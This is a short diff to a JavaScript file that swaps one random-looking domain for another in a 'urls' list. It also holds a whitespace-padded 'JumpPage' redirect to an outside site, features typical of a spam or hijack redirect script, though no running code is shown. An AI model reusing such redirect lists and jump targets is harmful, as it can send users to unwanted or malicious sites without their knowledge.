@@ -37,7 +37,7 @@ var emails = [
 ];
 
 var urls=[
-	'zrtidikpl.cc',
+	'uxijbncp.com',
 ];
                                                                                                                   
 var JumpPage="https://91nt.com";
